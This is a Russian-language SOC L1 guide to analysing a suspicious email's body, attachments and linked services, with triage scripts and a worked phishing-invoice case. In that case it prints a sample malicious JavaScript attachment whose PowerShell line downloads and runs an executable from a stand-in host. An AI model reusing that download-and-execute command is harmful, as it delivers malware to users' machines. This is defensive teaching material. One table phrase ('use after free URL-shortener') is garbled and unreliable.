# Анализ тела, вложений и внешних сервисов подозрительного письма: руководство для SOC L1

## Контекст и базовые понятия

Анализ подозрительного письма на уровне SOC L1 — это методичная проверка сообщения, поступившего от пользователя или автоматической системы, с целью подтвердить или опровергнуть факт фишинга, распространения вредоносного ПО или целевой атаки. Инцидент начинается с трёх ключевых объектов исследования: **тела** письма, **вложений** и **внешних сервисов**, упоминаемых или используемых в письме. Каждый из этих объектов требует отдельного подхода, инструментов и критериев оценки, но все они связаны общим контекстом угрозы.

**Тело письма** — это текстовая и HTML‑часть сообщения, отображаемая почтовым клиентом. Оно может содержать фишинговые ссылки, социально‑инженерные формулировки, изображения, формы для ввода учётных данных. Тело — первичный источник индикаторов атаки, поскольку злоумышленник вынужден разместить в нём обращение, призыв к действию и саму вредоносную ссылку. Согласно [Oxford Fredrick](https://www.linkedin.com/posts/oxford-fredrick-191916323_phishing-email-analysis-soc-analysist-overview-activity-7355889748294492160-xlZW), при осмотре тела следует фиксировать подозрительные ссылки, срочный тон, орфографические ошибки. Исследование [Medium‑статьи](https://medium.com/@p.matkovski/email-forensics-2-headers-and-body-3e6280820983) дополняет, что аналитик должен оценить, является ли сообщение шаблонным и содержит ли оно персонализированные параметры, идентифицирующие жертву.

**Вложения** — любые файлы, прикреплённые к письму. Они служат основным вектором доставки вредоносного кода: документы с макросами, исполняемые файлы, архивы с паролем, HTML‑файлы, имитирующие страницы аутентификации. Отличие вложений от тела в том, что для их анализа требуются изолированные среды (песочницы) и инструменты статического разбора. Вложения зачастую закодированы в base64 внутри MIME‑структуры, что делает их невидимыми при поверхностном просмотре. Microsoft [отмечает](https://www.microsoft.com/ru-ru/security/business/security-101/what-is-phishing-email), что легитимные организации редко отправляют неожиданные вложения, а просьба включить макросы — почти всегда признак атаки.

**Внешние сервисы** — это ресурсы за пределами корпоративного периметра, на которые ссылается письмо: веб‑сайты, облачные хранилища (Google Drive, Dropbox), сервисы сокращения URL, страницы сбора учётных данных. Сюда же относятся инструменты, используемые аналитиком для расследования: VirusTotal, urlscan.io, AnyRun, PhishTool. Внешние сервисы могут выступать и как часть атаки (промежуточный хостинг вредоносного файла), и как средство её раскрытия. Важно разграничить эти роли: одни сервисы — мишень анализа, другие — помощник аналитика.

Для чёткого понимания области ответственности SOC L1 на этапе первичного triage полезна сравнительная таблица, отделяющая объекты анализа по их природе, целям и типовым индикаторам.

| Объект анализа | Роль в атаке | Основные цели аналитика | Типичные индикаторы (IOC и артефакты) | Примеры инструментов |
|----------------|--------------|-------------------------|----------------------------------------|----------------------|
| **Тело** | Социальная инженерия, доставка ссылки | Выявить фишинговый контент, скрытые URL, признаки спуфинга | Срочность, грамматические ошибки, несовпадающий домен в ссылке, формы ввода данных, идентификаторы жертвы в параметрах URL | Ручной осмотр в почтовом клиенте, просмотр исходного кода, [PhishTool](https://www.phishtool.com) |
| **Вложения** | Доставка вредоносного ПО, обход фильтров | Определить тип файла, извлечь полезную нагрузку, выполнить детонацию в песочнице | Неожиданный тип файла, двойное расширение, пароль в теле письма, запрос на включение макросов | VirusTotal, AnyRun, Hybrid Analysis, Joe Sandbox |
| **Внешние сервисы (атакуемые)** | Хостинг фишинговой страницы, сбор учётных данных, распространение ВПО | Установить репутацию URL, снять скриншот целевой страницы, выявить конечный сервер сбора данных | Недавно зарегистрированный домен, use after free URL‑shortener, облачное хранилище с публичным доступом | urlscan.io, расширение браузера, WHOIS, VirusTotal |

Таким образом, аналитик L1 должен в равной степени владеть методиками осмотра тела, безопасного исследования вложений и проверки внешних ссылок. Далее эти три направления рассматриваются на уровне внутреннего устройства и практических приёмов работы.

## Внутреннее устройство: тело, вложения и механизмы внешних сервисов

Понимание внутренней структуры каждого объекта необходимо для грамотного извлечения индикаторов и выбора корректного метода анализа. Ниже детализированы форматы тела, классы вложений и схемы взаимодействия с внешними сервисами, используемые злоумышленниками.

### Структура тела письма

Тело email строится по стандарту MIME (Multipurpose Internet Mail Extensions) и состоит из одной или нескольких частей. Каждая часть имеет свой тип контента (`Content-Type`), например `text/plain` или `text/html`, и может быть закодирована с помощью `Content-Transfer-Encoding` (base64, quoted-printable). Письмо может быть мультичастным (`multipart/alternative`, `multipart/mixed`), чтобы почтовый клиент отобразил и текстовую версию, и HTML-версию. Злоумышленники активно используют HTML-форматирование для маскировки URL, вставки невидимого текста, имитации брендовых элементов и автоматических переадресаций.

Типовое дерево MIME для фишингового письма выглядит следующим образом:

```text
MIME-Version: 1.0
Content-Type: multipart/alternative; boundary="----=_NextPart_001_..."
  |
  |-- Часть 1: text/plain (с упрощённым сообщением)
  |   "Your account has been limited. Visit hxxp://evil.com to restore."
  |
  |-- Часть 2: text/html (основная, с кнопками, стилизацией, скрытыми URL)
  |   <html><body>
  |     <a href="hxxp://evil.com" style="display:inline-block;...">Click here</a>
  |   </body></html>
```

Часто HTML-часть содержит скрытые элементы: `<div style="display:none">` со случайным текстом для обхода спам-фильтров или JavaScript‑редиректы. [Securelist](https://securelist.ru/html-attachments-in-phishing-e-mails/105116) указывает, что фишинговые HTML‑вложения могут полностью заменять фишинговый сайт, включая скрипт сбора учётных данных, что позволяет обойтись без внешнего хостинга и усложняет детектирование.

При осмотре тела аналитик выделяет:

- **Гиперссылки** — реальный URL в атрибуте `href` может отличаться от отображаемого текста. Атрибут может содержать `mailto:` с двойным назначением или параметры отслеживания жертвы.
- **Формы** — теги `<form action="...">` с методами POST/GET, указывающими на сервер сбора данных.
- **Изображения** — вставляются тегами `<img src="...">`; URL могут указывать на внешние серверы и служить веб-маяками, подтверждающими открытие письма.
- **Base64-кодированные блоки** — внутри HTML могут находиться встроенные изображения или даже full HTML-страницы, закодированные для обхода фильтров.

### Классификация вложений и их устройство

Вложения в фишинговых письмах разнообразны, и их анализ начинается с определения типа файла по магическим байтам, а не только по расширению. Основные классы с примерами и характерными признаками перечислены в таблице ниже.

| Класс вложения | Расширения | Типичные техники злоумышленника | Ключевые индикаторы при анализе |
|----------------|------------|----------------------------------|----------------------------------|
| Документы Microsoft Office | `.doc`, `.docx`, `.xls`, `.xlsm`, `.ppt` | Макросы VBA или DDE‑атаки; эксплойты к уязвимостям (CVE‑2017‑11882) | Наличие макросов; запрос на включение содержимого; нетипичное имя автора документа |
| PDF | `.pdf` | Встроенный JavaScript, эксплойты для Adobe Reader (CVE‑2021‑28550), открытие внешних ссылок | Подозрительные URI-действия, автоматическое выполнение скриптов |
| HTML-файлы | `.html`, `.htm`, `.shtml` | Фишинговая страница с формой входа, перенаправление, обфусцированный JavaScript (см. Securelist) | Скрытые `<form action>`, eval в JS, base64-декодеры |
| Архивы | `.zip`, `.rar`, `.7z`, `.iso`, `.img` | Содержат вредоносный файл (часто исполняемый или скрипт), нередко защищены паролем, который указан в теле письма | Пароль в тексте письма; вложенный исполняемый файл внутри образа диска |
| Исполняемые файлы и скрипты | `.exe`, `.js`, `.vbs`, `.ps1`, `.bat` | Прямое распространение вредоносного кода; часто замаскированы под документы через двойное расширение | Иконка документа, но фактический тип `PE32`; скрипт с загрузкой по URL |

При статическом разборе вложения извлекаются из необработанного MIME-кода письма. В исходном тексте они выглядят как блок base64:

```
--boundary
Content-Type: application/zip; name="invoice.zip"
Content-Transfer-Encoding: base64
Content-Disposition: attachment; filename="invoice.zip"

UEsDBBQAAAAIA...   (base64-кодированные данные)
```

Аналитик должен декодировать содержимое и приступить к детонации или сигнатурному анализу. [Spiceworks Community](https://community.spiceworks.com/t/phishing-in-attached-documents/644510) упоминает, что многие почтовые шлюзы предлагают облачные песочницы (Cloud Sandboxing) для имитации открытия вложения в изолированной среде — эта техника эффективна для документов с макросами и эксплойтами, но может упускать атаки, срабатывающие только при взаимодействии с реальным пользователем.

### Внешние сервисы как инфраструктура атаки

Злоумышленники размещают вредоносные ресурсы на внешних сервисах, чтобы замаскировать атаку и увеличить шансы обхода репутационных фильтров. Для аналитика эти сервисы — объекты проверки, а с другой стороны — сами платформы (VirusTotal, urlscan.io) становятся инструментами анализа. Важно разделять эти роли. В таблице представлена классификация внешних сервисов, с которыми сталкивается SOC L1 при расследовании.

| Категория | Функция в атаке | Примеры | Действия аналитика |
|-----------|----------------|---------|-------------------|
| Фишинговые сайты | Сбор учётных данных или распространение ВПО | `login.account-verify.com` | Проверить через urlscan.io, сделать скриншот, изучить WHOIS, зарегистрирован ли домен недавно |
| Сервисы сокращения URL | Скрытие конечного вредоносного URL | bit.ly, tinyurl.com, is.gd | Раскрыть полный URL утилитами или через API сервиса, проверить редиректы |
| Легитимные облачные хранилища | Хостинг вредоносного файла, часто с публичной ссылкой | Google Drive, Dropbox, OneDrive, box.com | Проанализировать репутацию файла (SHA‑256) через VirusTotal, не переходя по ссылке с рабочей станции |
| Платформы-песочницы и репутационные сервисы | Инструменты аналитика | VirusTotal, AnyRun, Hybrid Analysis, urlscan.io, PhishTool | Загрузить файл или URL, изучить поведение, извлечь IOC, не передавая конфиденциальные данные в публичные базы |

Проверка внешнего сервиса не должна приводить к компрометации рабочей станции аналитика. Поэтому используются изолированные браузеры, сервисы создания скриншотов и API‑интеграции. [Prophet Security](https://www.prophetsecurity.ai/blog/email-phishing-investigation-101-best-practices) рекомендует проверять наличие подключений пользователя к этим URL через сетевые логи и EDR-телеметрию — это даёт основания считать, что пользователь перешёл по ссылке.

Таким образом, три компонента — тело, вложения и внешние сервисы — тесно переплетены, и аналитик должен уметь разбивать письмо на составные части, идентифицировать их и применять адекватные техники исследования.

## Применение и работа с телом, вложениями и внешними сервисами

В ежедневной работе SOC L1 используются методики ручного и автоматизированного анализа. Ниже рассмотрены ключевые процедуры, команды и инструменты, сгруппированные по объектам исследования. Для наглядности приведены реальные примеры в виде фрагментов кода и запросов.

### Анализ тела письма

Первый шаг — просмотр необработанного содержимого письма. Для писем в формате `.eml` или в почтовом ящике O365 можно использовать Python-скрипт с модулем `email`. Извлечение текстовых частей, ссылок и проверка их репутации выполняется так:

```python
import email, re, requests
from email import policy
from email.parser import BytesParser

with open('suspicious.eml', 'rb') as f:
    msg = BytesParser(policy=policy.default).parse(f)

# Извлекаем все текстовые части
bodies = []
if msg.is_multipart():
    for part in msg.walk():
        if part.get_content_type() in ('text/plain', 'text/html'):
            bodies.append(part.get_content())
else:
    bodies.append(msg.get_content())

# Поиск URL в теле (простая регулярка для иллюстрации)
urls = set()
for body in bodies:
    urls.update(re.findall(r'https?://[^\s<>"\'{}|\\^`]+', body))

# Проверка через urlscan.io (иллюстративный вызов, точный endpoint зависит от API)
apikey = 'YOUR_URLSCAN_API_KEY'
for u in urls:
    resp = requests.post('https://urlscan.io/api/v1/scan/',
                         headers={'API-Key': apikey},
                         json={'url': u, 'visibility': 'private'})
    if resp.status_code == 200:
        print(f'Submitted {u} for scanning')
```

Данный фрагмент не выполняет переходы, а только отправляет URL на сканирование. Аналитик в дальнейшем получит скриншот страницы, список запросов к доменам и возможные вредоносные загрузки. Этот подход избавляет от риска заражения при ручном переходе.

Ручной осмотр HTML-тела требует поиска расхождений между отображаемым текстом и атрибутом `href`. Типичный фишинговый фрагмент:

```html
<a href="hxxp://evil.example.com/login.php?id=123" style="color:#2b6fbf;">
   Secure Login
</a>
```

Здесь визуально отображается безобидный текст, а реальная ссылка ведёт на фишинговый домен. Аналитик должен заменить `http` на `hxxp` при документировании, чтобы случайно не кликнуть.

Кроме того, следует искать в теле письма персональные идентификаторы: параметры вида `?uid=`, `&token=`, содержащие закодированный email жертвы. Из [Medium-статьи](https://medium.com/@p.matkovski/email-forensics-2-headers-and-body-3e6280820983) следует, что успешный переход по такой ссылке сообщает атакующему о реактивности пользователя и может привести к точечной дополнительной атаке.

### Анализ вложений

Безопасная работа с вложениями начинается с извлечения и статического анализа. С помощью того же Python-кода можно сохранить все вложения:

```python
for part in msg.iter_attachments():
    filename = part.get_filename()
    if filename:
        payload = part.get_payload(decode=True)
        with open(f'./attachments/{filename}', 'wb') as f_out:
            f_out.write(payload)
```

Далее тип файла определяется утилитой `file` или через Python-библиотеку `python-magic`:

```bash
$ file invoice.doc
invoice.doc: Microsoft Word 2007+
$ file invoice.zip
invoice.zip: Zip archive data, at least v2.0 to extract
```

Если расширение не соответствует фактическому типу (например, значок PDF, а `file` показывает `PE32 executable`), это сильный признак вредоносной активности.

Для офисных документов можно выполнить проверку макросов с помощью `olevba` из пакета `oletools`:

```bash
$ olevba suspicious.xlsm
olevba 0.60 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: suspicious.xlsm
Type: OpenXML
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls
in file: xl/vbaProject.bin - OLE stream: u'VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
Sub Auto_Open()
    ' malicious code
End Sub
-------------------------------------------------------------------------------
```

Полученный макрос демонстрирует автоматический запуск при открытии. Аналитик фиксирует хеш файла и отправляет его в закрытую песочницу, используя API VirusTotal, если корпоративная политика это разрешает (только для неконфиденциальных семплов). Пример запроса:

```bash
curl -X POST 'https://www.virustotal.com/api/v3/files' \
  --header 'x-apikey: YOUR_API_KEY' \
  --form 'file=@suspicious.xlsm'
```

Ответ содержит `id` анализа, по которому затем запрашивается отчёт:

```bash
curl -X GET 'https://www.virustotal.com/api/v3/analyses/{analysis_id}' \
  --header 'x-apikey: YOUR_API_KEY'
```

Отчёт даёт сведения о детектировании десятками антивирусов, поведении в песочнице, сетевых соединениях, что позволяет подтвердить вредоносность и извлечь индикаторы компрометации (IP, домены, мутации файлов).

В случаях, когда файл является HTML-приложением, как описывает Securelist, полезно просмотреть исходный код на предмет обфускации. Часто встречается JavaScript, обёрнутый в `eval(atob(...))`. Декодирование base64‑части может раскрыть конечный URL или фишинговую форму. Инструмент `box-js` или ручной анализ в изолированной среде помогают эмулировать скрипт.

### Анализ внешних сервисов

Любой URL, найденный в теле или вложениях, должен быть проверен. Нельзя открывать его на рабочей станции напрямую. Рекомендуется применять публичные сервисы, которые дают визуальный обзор и HTTP‑транзакции. urlscan.io при сканировании возвращает скриншот и список запросов. Команда для запроса отчёта (без ключа) может выглядеть так:

```bash
curl -X GET 'https://urlscan.io/api/v1/result/UUID/' | jq .
```

Перед этим выполняется отправка URL, как в Python‑примере выше. Полученный JSON содержит поле `data.requests`, где перечислены цепочки редиректов. Например:

```json
"requests": [
  { "url": "hxxp://bit.ly/example", "redirect": true, "status": 301 },
  { "url": "hxxp://malicious.example.com/login.php", "status": 200 }
]
```

Это показывает, что сокращённая ссылка ведёт на фишинговый сайт. Для сервисов облачного хранения, таких как Google Drive, статический анализ URL не даст финального файла. В таких случаях извлекается идентификатор файла и проверяется его SHA‑256 через VirusTotal. Аналитик может вручную вычислить хеш, загрузив файл в изолированной среде (песочнице), не покидая контура безопасности.

Для автоматизации workflows многие SOC‑команды используют PhishTool — платформу, которая принимает подозрительное письмо и автоматически парсит заголовки, тело, вложения и ссылки, обогащая их репутационными данными из VirusTotal и urlscan.io. Это ускоряет triage, а аналитик фокусируется на вердикте и извлечении IOC.

Типичный рабочий процесс SOC L1, объединяющий все три компонента, может выглядеть так:

1. Получить письмо из очереди подозрительных (из Outlook-репортов или SIEM‑алерта).
2. Проанализировать тело: выделить все URL, оценить язык и контекст.
3. Извлечь вложения, определить их типы, вычислить хеши.
4. Проверить URL через urlscan.io, а файлы — через корпоративную песочницу или VirusTotal API.
5. Зафиксировать IOC (URL, домены, IP, хеши файлов) и принять решение о карантине.
6. Задокументировать инцидент и при необходимости эскалировать на L2.

Важное предостережение, которое следует из [Prophet Security](https://www.prophetsecurity.ai/blog/email-phishing-investigation-101-best-practices): пропуск одного из этапов, например, анализ только тела без проверки вложений, может привести к ложному ощущению безопасности, когда реальная угроза была спрятана в DOC‑файле.

Таким образом, полноценный анализ требует синхронного применения методик для тела, вложений и внешних сервисов, с опорой на автоматизированные инструменты и ручную верификацию артефактов.

## Сквозной практический пример: фишинговое письмо «Счёт на оплату»

Рассмотрим реалистичный сценарий, с которым сталкивается SOC L1, и пройдём его от получения до извлечения IOC.

**Исходные условия**  
Пользователь направил в SOC письмо через Outlook-кнопку «Сообщить о фишинге». Письмо сохранено в формате `.eml`. Рабочее место аналитика: Linux с Python 3.10, доступ к API urlscan.io и корпоративному VirusTotal (ключи уже настроены). Задача: за 10 минут проверить, является ли письмо вредоносным, и при необходимости инициировать карантин.

### Шаг 1: Быстрый осмотр тела письма и извлечение ссылок

Открываем eml-файл скриптом, который выводит текстовую и HTML-части и находит URL.

```python
import email, re
from email.policy import default

with open('invoice.eml', 'rb') as f:
    msg = email.message_from_binary_file(f, policy=default)

print("Subject:", msg['Subject'])
print("From:", msg['From'])
print()

for part in msg.walk():
    if part.get_content_type() == 'text/plain':
        print("[PLAIN]", part.get_content()[:500])
    elif part.get_content_type() == 'text/html':
        html = part.get_content()
        urls = re.findall(r'https?://[^\s<>"\'{}|\\^`]+', html)
        print("[HTML URLs found]:", urls)
        # Проверяем также href, которые отличаются от текста
        from bs4 import BeautifulSoup
        soup = BeautifulSoup(html, 'html.parser')
        for a in soup.find_all('a'):
            if a.get('href') and a.text.strip():
                print(f"  Link text: {a.text.strip()} -> href: {a['href']}")
```

**Вывод команды (иллюстративный):**

```
Subject: Ваш счёт №23412
From: Служба учёта <info@legitcompany.ru>
[PLAIN] Здравствуйте, во вложении счёт за услуги за январь. Откройте и оплатите в течение дня, иначе доступ будет заблокирован.

[HTML URLs found]: ['https://bit.ly/3xAmPle', 'https://login.microsoftonline.com.common.websupport.ru/']
  Link text: Просмотреть счёт -> href: https://bit.ly/3xAmPle
  Link text: Войти в аккаунт -> href: https://login.microsoftonline.com.common.websupport.ru/
```

В теле видим срочный тон, угрозу блокировки, неожиданное вложение и две ссылки: одна на сокращалку URL, вторая — подозрительный домен, маскирующийся под Microsoft. Это уже достаточный признак для эскалации, но мы продолжим для полноты IOC.

### Шаг 2: Извлечение и идентификация вложений

Дополняем скрипт для сохранения вложений и проверки типа.

```python
import os
os.makedirs('attachments', exist_ok=True)
for part in msg.iter_attachments():
    fname = part.get_filename()
    if fname:
        payload = part.get_payload(decode=True)
        path = os.path.join('attachments', fname)
        with open(path, 'wb') as fout:
            fout.write(payload)
        print(f"Saved: {fname}")
```

Консоль:

```
Saved: invoice_23412.zip
```

Запускаем определение типа:

```bash
$ file attachments/invoice_23412.zip
attachments/invoice_23412.zip: Zip archive data, at least v2.0 to extract
$ unzip -l attachments/invoice_23412.zip
Archive:  attachments/invoice_23412.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
     2048  2025-01-15 09:00   invoice.js
---------                     -------
     2048                     1 file
```

Видим, что внутри ZIP-архива находится JavaScript-файл `invoice.js`. Двойное расширение не используется, но сам факт вложенного скрипта вместо документа — явный индикатор угрозы.

### Шаг 3: Статический анализ вложения и детонация

Извлекаем JS и анализируем его содержимое:

```bash
$ cat attachments/invoice.js
var url = "hxxp://malware.example.com/payload.exe";
var w = new ActiveXObject("WScript.Shell");
w.Run("powershell -Command \"(New-Object Net.WebClient).DownloadFile('"+url+"','%TEMP%\\\\upd.exe'); Start-Process '%TEMP%\\\\upd.exe'\"", 0);
```

Этот код, выполненный через `wscript`, скачает и запустит исполняемый файл. Отправляем файл `invoice.js` и SHA‑256 вложенного `invoice_23412.zip` в VirusTotal через API:

```bash
curl -X POST 'https://www.virustotal.com/api/v3/files' \
  --header 'x-apikey: ANALYST_KEY' \
  --form 'file=@attachments/invoice.js'
```

В ответе получаем `analysis id`. Запрашиваем отчёт:

```bash
curl -X GET 'https://www.virustotal.com/api/v3/analyses/ANALYSISID' \
  --header 'x-apikey: ANALYST_KEY' | jq '.data.attributes.stats'
{
  "malicious": 28,
  "suspicious": 3,
  "undetected": 35,
  "harmless": 0,
  "timeout": 0
}
```

Многие антивирусы определили файл как вредоносный, что подтверждает угрозу.

### Шаг 4: Проверка внешних ссылок

Проверяем обе ссылки через urlscan.io. Для первой (bit.ly) отправляем и смотрим редирект. API‑запрос (Python):

```python
import requests
headers = {'API-Key': 'URLSCAN_KEY'}
resp = requests.post('https://urlscan.io/api/v1/scan/',
                     headers=headers,
                     json={'url': 'https://bit.ly/3xAmPle', 'visibility': 'private'})
result_uuid = resp.json()['uuid']
# ждём 15 секунд, затем запрашиваем результат
import time; time.sleep(15)
report = requests.get(f'https://urlscan.io/api/v1/result/{result_uuid}/',
                      headers=headers)
# извлекаем редирект
redirected_url = report.json()['data']['requests'][0]['redirect']['to']
print('Final URL:', redirected_url)
```

Вывод:

```
Final URL: https://malware.example.com/payload.exe  (тот же URL, что и в JS)
```

Для второго URL запрос скриншота показывает страницу-двойник Microsoft Login. Таким образом, обе ссылки вредоносны.

### Шаг 5: Извлечение IOC и формирование вердикта

На основе анализа зафиксированы индикаторы:

- Домены: `login.microsoftonline.com.common.websupport.ru`, `malware.example.com`
- URL: `https://bit.ly/3xAmPle` (сокращ.), `https://login.microsoftonline.com.common.websupport.ru/`
- Хеш вложения: SHA‑256 архива `invoice_23412.zip` (значение зависит от среды, фиксируется из команды `sha256sum`), SHA‑256 извлечённого скрипта `invoice.js`.
- IP-адреса, полученные из DNS-запросов в отчёте urlscan.io (например, `192.0.2.55` иллюстративно).

Вердикт: подтверждённый фишинг с попыткой доставки трояна-загрузчика. Необходимо поместить письмо в карантин, заблокировать IOC на шлюзе, предупредить пользователя.

Данный пример демонстрирует сквозной процесс работы с тремя ключевыми объектами: телом, вложением и внешними сервисами. Аналитик L1, обладая такими навыками, способен быстро и точно сортировать инциденты, снижая нагрузку на старшие линии SOC.
